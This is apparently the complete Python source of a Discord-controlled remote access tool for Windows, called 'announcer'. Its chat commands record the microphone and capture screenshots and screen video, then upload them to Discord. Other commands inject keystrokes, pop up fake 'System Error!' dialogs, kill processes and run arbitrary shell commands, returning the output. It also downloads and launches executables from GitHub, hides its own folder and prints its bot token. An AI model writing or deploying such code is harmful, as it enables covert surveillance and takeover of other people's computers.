import os
import discord
import asyncio
import requests
import pyautogui
from gtts import gTTS
import pygame
import time
from threading import Thread
from tkvideo import tkvideo
import tkinter as tk
from tkinter import messagebox
from dotenv import load_dotenv
from urllib.request import urlretrieve
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
import ctypes
import shutil
import subprocess
import wave


from PIL import ImageGrab, Image, ImageTk

# Load token from .env
load_dotenv()
token = os.getenv("Ethan")
if not token:
    load_dotenv(dotenv_path='C:\\announcer\\.env')
    token = os.getenv("Ethan")
print(f"Token value: {token}")

timeout = 1

async def wifi_check():
    while True:
        try:
            requests.head("https://discord.com", timeout=timeout)
            print('The internet connection is active')
            break
        except requests.ConnectionError:
            print("The internet connection is down, retrying...")
            await asyncio.sleep(1)

# Run wifi check before starting the bot
asyncio.run(wifi_check())

class MyClient(discord.Client):
    async def on_disconnect(self):
        print("Bot disconnected from Discord (possible internet loss).")

    async def on_resumed(self):
        print("Bot reconnected to Discord.")

    async def on_ready(self):
        print(f'Logged on as {self.user}!')
        await self.change_presence(activity=discord.Game(name="Started!"))
        await asyncio.sleep(3)
        await self.change_presence(activity=discord.Game(name="Online"))

    async def on_message(self, message):
        try:
            # rec - Record audio
            if message.content == 'rec':
                def check(m):
                    return m.author == message.author and m.channel == message.channel

                import pyaudio
                p = pyaudio.PyAudio()
                device_list = []
                for i in range(p.get_device_count()):
                    info = p.get_device_info_by_index(i)
                    device_list.append(f"{i}: {info.get('name')}")
                device_list_str = "\n".join(device_list)
                with open('device_list.txt', 'w') as f:
                    f.write(device_list_str)
                await message.channel.send(file=discord.File('device_list.txt'))
                os.remove('device_list.txt')

                await message.channel.send('Please enter the device index of the mic you would like to use')
                msg = await self.wait_for('message', check=check)
                device_index = int(msg.content)

                await message.channel.send('How long would you like to record (in seconds)?')
                msg = await self.wait_for('message', check=check)
                record_seconds = int(msg.content)

                chunk = 1024
                sample_format = pyaudio.paInt32
                channels = 1
                rate = 44100

                stream = p.open(format=sample_format,
                                channels=channels,
                                rate=rate,
                                input=True,
                                input_device_index=device_index,
                                frames_per_buffer=chunk)

                await message.channel.send(f'Recording for {record_seconds} seconds...')
                frames = []
                for _ in range(0, int(rate / chunk * record_seconds)):
                    data = stream.read(chunk)
                    frames.append(data)

                stream.stop_stream()
                stream.close()
                p.terminate()

                wf = wave.open('output.wav', 'wb')
                wf.setnchannels(channels)
                wf.setsampwidth(p.get_sample_size(sample_format))
                wf.setframerate(rate)
                wf.writeframes(b''.join(frames))
                wf.close()

                await message.channel.send(file=discord.File('output.wav'))
                os.remove('output.wav')

            # upd - Update the application
            if message.content == 'upd':
                url = "https://github.com/Plexisity/announcer/raw/main/update.exe"
                filename = "download.exe"
                os.system("taskkill /f /im update.exe")
                urlretrieve(url, filename)
                if os.path.exists("update.exe"):
                    print("File already exists. Deleting it...")
                    await message.channel.send('"File already exists. Deleting it...')
                    os.remove("update.exe")
                os.replace("download.exe", r".\update.exe")
                os.startfile(r".\update.exe")
                await message.channel.send('Updating...')
                await self.change_presence(activity=discord.Game(name="Updating..."))

            # scr - Take a screenshot
            if message.content == 'scr':
                await message.channel.send('Please enter the amount of screenshots you would like to take')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await self.wait_for('message', check=check)
                amount = int(msg.content)
                for i in range(amount):
                    im = ImageGrab.grab()
                    im.save('screenshot.png')
                    await message.channel.send(file=discord.File('screenshot.png'))
                    os.remove('screenshot.png')
                    await asyncio.sleep(1)

            # tts - Text-to-speech
            if message.content == 'tts':
                if message.author == self.user:
                    return
                await message.channel.send('Please enter the message you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await self.wait_for('message', check=check)
                async def Playsound():
                    message_content = (msg.content)
                    player = gTTS(text=message_content, lang='en', slow=False)
                    player.save("msg.mp3")
                    pygame.mixer.init()
                    pygame.mixer.music.load("msg.mp3")
                    pygame.mixer.music.play()
                    while pygame.mixer.music.get_busy():
                        await asyncio.sleep(0.1)
                    pygame.mixer.music.unload()
                    os.remove("msg.mp3")
                await Playsound()

            # msg - Display a message box
            if message.content == 'msg':
                await message.channel.send('Please enter the message you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await self.wait_for('message', check=check)
                if msg.content == 'cancel':
                    await message.channel.send('Message sending cancelled')
                    return
                def Dialog_Box():
                    message_content = (msg.content)
                    root = tk.Tk()
                    root.withdraw()
                    root.attributes('-topmost', True)
                    messagebox.showinfo("System Error!", message_content)
                    root.destroy()
                t2 = Thread(target=Dialog_Box)
                t2.start()
                t2.join()

            # lock - Lock the screen
            if message.content == 'lock':
                os.system("rundll32.exe user32.dll,LockWorkStation")
                await message.channel.send('Screen Locked')

            # key - Send keystrokes
            if message.content == 'key':
                await message.channel.send('Please enter the keystrokes you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await self.wait_for('message', check=check)
                pyautogui.typewrite(msg.content)
                await message.channel.send('Keystrokes sent')

            # close - Close a process
            if message.content == 'close':
                os.system('tasklist > tasklist.txt')
                await message.channel.send(file=discord.File('tasklist.txt'))
                os.remove('tasklist.txt')
                await message.channel.send('Please enter the process you would like to close')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await self.wait_for('message', check=check)
                await message.channel.send(f'Closing {msg.content}')
                os.system(f'taskkill /f /im {msg.content}')

            # img - Show an image for half a second
            if message.content == 'img':
                await message.channel.send('Please upload the image you would like to display')
                def check(m):
                    return m.author == message.author and m.channel == message.channel and m.attachments
                msg = await self.wait_for('message', check=check)
                attachment = msg.attachments[0]
                await attachment.save('temp_image.png')
                def show_image():
                    root = tk.Tk()
                    root.attributes('-topmost', True)
                    img = Image.open('temp_image.png')
                    img = ImageTk.PhotoImage(img)
                    panel = tk.Label(root, image=img)
                    panel.pack(side="top", fill="both", expand="yes")
                    root.after(500, lambda: root.destroy())
                    root.mainloop()
                show_image()
                os.remove('temp_image.png')

            # vid - Play a video (no audio)
            if message.content == 'vid':
                await message.channel.send('Please upload the video you would like to display')
                def check(m):
                    return m.author == message.author and m.channel == message.channel and m.attachments
                msg = await self.wait_for('message', check=check)
                attachment = msg.attachments[0]
                await attachment.save('temp_video.mp4')
                # play video in tkinter window using tkvideo
                def play_video():
                    root = tk.Tk()
                    root.attributes('-topmost', True)
                    label = tk.Label(root)
                    label.pack()
                    player = tkvideo("temp_video.mp4", label, loop=0, size=(640, 480))
                    player.play()
                    root.mainloop()
                t1 = Thread(target=play_video)
                t1.start()
                t1.join()
                os.remove('temp_video.mp4')

            # sound - Play a user defined sound
            if message.content == 'sound':
                await message.channel.send('Please upload the sound you would like to play')
                def check(m):
                    return m.author == message.author and m.channel == message.channel and m.attachments
                msg = await self.wait_for('message', check=check)
                attachment = msg.attachments[0]
                await attachment.save('temp_sound.mp3')
                async def play_sound():
                    pygame.mixer.init()
                    pygame.mixer.music.load('temp_sound.mp3')
                    pygame.mixer.music.play()
                    while pygame.mixer.music.get_busy():
                        await asyncio.sleep(0.1)
                    pygame.mixer.music.unload()
                    os.remove('temp_sound.mp3')
                await play_sound()

            # vol - Change volume
            if message.content == 'vol':
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume_interface = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
                volume_interface.SetMute(0, None)
                current_volume = volume_interface.GetMasterVolumeLevelScalar()
                await message.channel.send(f'Current volume: {current_volume * 100}%')
                await message.channel.send('Please enter the volume you would like to set (0-100)')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await self.wait_for('message', check=check)
                if msg.content == 'cancel':
                    await message.channel.send('Volume change cancelled')
                    return
                volume = float(msg.content) / 100.0
                volume_interface.SetMasterVolumeLevelScalar(volume, None)
                await message.channel.send(f'Volume set to {msg.content}%')

            # help - Display help message
            if message.content == 'help':
                help_message = (
                    "Available commands:\n"
                    "rec - Record audio\n"
                    "upd - Update the application\n"
                    "scr - Take a screenshot\n"
                    "tts - Text-to-speech\n"
                    "msg - Display a message box\n"
                    "lock - Lock the screen\n"
                    "key - Send keystrokes\n"
                    "close - Close a process\n"
                    "img - Display an image\n"
                    "vid - Display a video\n"
                    "sound - Play a sound\n"
                    "vol - Set the volume\n"
                    "min - Minimize all windows\n"
                    "scrvid - Record a video of the screen\n"
                    "cmd - Run a command\n"
                    "selfdestruct - Self-destruct the application\n"
                    "hide - Hide the announcer folder\n"
                    "unhide - Unhide the announcer folder\n"
                    "help - Show this help message\n"
                )
                await message.channel.send(help_message)

            # min - Press Win+D
            if message.content == 'min':
                pyautogui.hotkey('win', 'd')
                await message.channel.send('Minimized all windows')

            # scrvid - Record a video of the screen using ffmpeg
            if message.content == 'scrvid':
                await message.channel.send('Please enter the duration of the video you would like to record (in seconds)')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await self.wait_for('message', check=check)
                duration = int(msg.content)
                await message.channel.send('Recording video...')
                fps = 10
                frame_folder = "frames"
                os.makedirs(frame_folder, exist_ok=True)
                start_time = time.time()
                frame_count = 0
                while time.time() - start_time < duration:
                    screenshot = pyautogui.screenshot()
                    frame_path = os.path.join(frame_folder, f"frame_{frame_count:05d}.png")
                    screenshot.save(frame_path)
                    frame_count += 1
                    await asyncio.sleep(1 / fps)
                await message.channel.send('Encoding video with ffmpeg...')
                ffmpeg_path = os.path.join(os.getcwd(), "ffmpeg.exe")
                output_video = "output.mp4"
                input_pattern = os.path.join(frame_folder, "frame_%05d.png")
                cmd = [
                    ffmpeg_path,
                    "-y",
                    "-framerate", str(fps),
                    "-i", input_pattern,
                    "-c:v", "libx264",
                    "-pix_fmt", "yuv420p",
                    output_video
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                print(result.stdout)
                print(result.stderr)
                if os.path.exists(output_video):
                    await message.channel.send(file=discord.File(output_video))
                    os.remove(output_video)
                else:
                    await message.channel.send("Failed to create video.")
                for f in os.listdir(frame_folder):
                    os.remove(os.path.join(frame_folder, f))
                os.rmdir(frame_folder)

            # cmd - Run a console command
            if message.content == 'cmd':
                await message.channel.send('Please enter the command you would like to run')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await self.wait_for('message', check=check)
                if msg.content == 'cancel':
                    await message.channel.send('Command cancelled')
                else:
                    try:
                        output = os.popen(msg.content).read()
                        await message.channel.send(f'Command \"{msg.content}\" executed')
                        if output:
                            for i in range(0, len(output), 1900):
                                await message.channel.send(f'Command output:\n{output[i:i+1900]}')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {str(e)}')

            # selfdestruct - Self-destruct the application
            if message.content == 'selfdestruct':
                os.system('taskkill /f /im index.exe')
                await message.channel.send('Self-destruct sequence initiated')
                
                url = "https://github.com/Plexisity/announcer/raw/main/delete.exe"
                filename = "delete.exe"
                urlretrieve(url, filename)
                shutil.move("delete.exe", os.path.expandvars(r"%appdata%\delete.exe"))
                os.startfile(os.path.expandvars(r"%appdata%\delete.exe"))
                await message.channel.send('Deleting files...')
                await self.change_presence(activity=discord.Game(name="Self-destructing..."))
                await message.channel.send('goodbye...')
                

            # hide - Hide the announcer folder
            if message.content == 'hide':
                os.system('attrib +h C:\\announcer')
                await message.channel.send('Folder hidden')

            # unhide - Unhide the announcer folder
            if message.content == 'unhide':
                os.system('attrib -h C:\\announcer')
                await message.channel.send('Folder unhidden')

        except Exception as e:
            await message.channel.send(f"An error occurred: {e}")

intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run(str(token))